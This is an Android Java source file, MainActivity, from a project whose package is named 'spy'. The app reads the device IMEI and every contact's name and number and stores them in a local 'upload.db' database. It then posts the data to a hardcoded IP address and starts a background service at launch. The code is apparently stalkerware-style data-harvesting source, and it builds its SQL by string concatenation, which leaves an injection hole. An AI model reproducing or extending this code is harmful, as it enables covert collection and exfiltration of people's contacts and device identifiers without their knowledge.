package com.example.subhasis.spy;

import android.Manifest;
import android.content.Context;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.Toast;

import java.util.ArrayList;

import static android.Manifest.permission.READ_CONTACTS;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    ListView listView;
    ArrayList<String> StoreContacts;
    ArrayAdapter<String> arrayAdapter;
    Cursor cursor;
    String name, phonenumber;
    public static final int RequestPermissionCode = 1;
    public static final int RequestIMEIPermissionCode = 2;

    Button button;
    String sql;

    String IMEI_Number_Holder;
    TelephonyManager telephonyManager;
    public  static  String ip="172.27.27.89";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        EnableRuntimePermission();
        startService(new Intent(this, BackgroundService.class));

        listView = (ListView) findViewById(R.id.listview1);

        button = (Button) findViewById(R.id.contact);

        StoreContacts = new ArrayList<String>();



        telephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        IMEI_Number_Holder = telephonyManager.getDeviceId();

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                GetContactsIntoArrayList();

                arrayAdapter = new ArrayAdapter<String>(
                        MainActivity.this,
                        R.layout.contact_items_listview,
                        R.id.textView, StoreContacts
                );

                listView.setAdapter(arrayAdapter);


            }
        });
        /*
        try {
            IMEI_Number_Holder = telephonyManager.getDeviceId();
        }
        catch(Exception e){}
*/
        sql= "CREATE TABLE IF NOT EXISTS contacts(name VARCHAR(100),contact VARCHAR(20), imei VARCHAR(30), PRIMARY KEY(contact,imei));";
        SQLiteDatabase sqLiteDatabase = getBaseContext().openOrCreateDatabase("upload.db", MODE_PRIVATE, null);
        try {
            sqLiteDatabase.execSQL(sql);
        }
        catch(Exception e)
        {

        }
        sqLiteDatabase.close();
        startService(new Intent(this, BackgroundService.class));





    }

    public void GetContactsIntoArrayList() {

        cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        SQLiteDatabase sqLiteDatabase = getBaseContext().openOrCreateDatabase("upload.db", MODE_PRIVATE, null);
        String sql;
        while (cursor.moveToNext()) {

            name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

            phonenumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            StoreContacts.add(name + " " + ":" + " " + phonenumber);


            sql = "INSERT INTO contacts(name,contact,imei) VALUES('" + cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)) + "','" + cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))+"','"+ IMEI_Number_Holder + "');";

            Log.d(TAG, "onOptionsItemSelected: INSERTED INTO cont DATABASE");
            try {
                sqLiteDatabase.execSQL(sql);
            }catch (Exception e){
                Log.e(TAG, "onOptionsItemSelected:Repeated Values " );
            }

        }

        cursor.close();
        sqLiteDatabase.close();

        PostData postData=new PostData();
        postData.execute("http://"+ip+"/", "1");

    }

    public void EnableRuntimePermission() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            int contactPermision = ContextCompat.checkSelfPermission(this, READ_CONTACTS);
            Log.d(TAG, "onCreate: self Check");

            if (contactPermision == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "onCreate: Permission Granted");
                //READ_CODE_GRANTED = true;

            } else {
                Log.d(TAG, "onCreate: Requesting Permission");
                ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS}, RequestPermissionCode);
            }

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "onCreate: Permission Granted");
                //READ_CODE_GRANTED = true;

            } else {
                Log.d(TAG, "onCreate: Requesting Permission");
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, RequestIMEIPermissionCode);

            }
        }
    }

    @Override

        public void onRequestPermissionsResult(int RC, String per[], int[] PResult) {

        switch (RC) {

            case RequestPermissionCode:

                if (PResult.length > 0 && PResult[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(MainActivity.this, "Permission Granted, Now your application can access CONTACTS.", Toast.LENGTH_LONG).show();

                } else {

                    Toast.makeText(MainActivity.this, "Permission Canceled, Now your application cannot access CONTACTS.", Toast.LENGTH_LONG).show();

                }
                break;
            case RequestIMEIPermissionCode:

                if (PResult.length > 0 && PResult[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(MainActivity.this, "Permission Granted, Now your application can access READ_PHONE_STATE.", Toast.LENGTH_LONG).show();

                } else {

                    Toast.makeText(MainActivity.this, "Permission Canceled, Now your application cannot access READ_PHONE_STATE.", Toast.LENGTH_LONG).show();

                }
                break;
        }
    }

    public void CallLogClicked(View view) {
        startActivity(new Intent(getApplicationContext(), call_logs.class));
        this.finish();
    }

    public void MessageClicked(View view) {
        startActivity(new Intent(getApplicationContext(), messages.class));
        this.finish();
    }
}
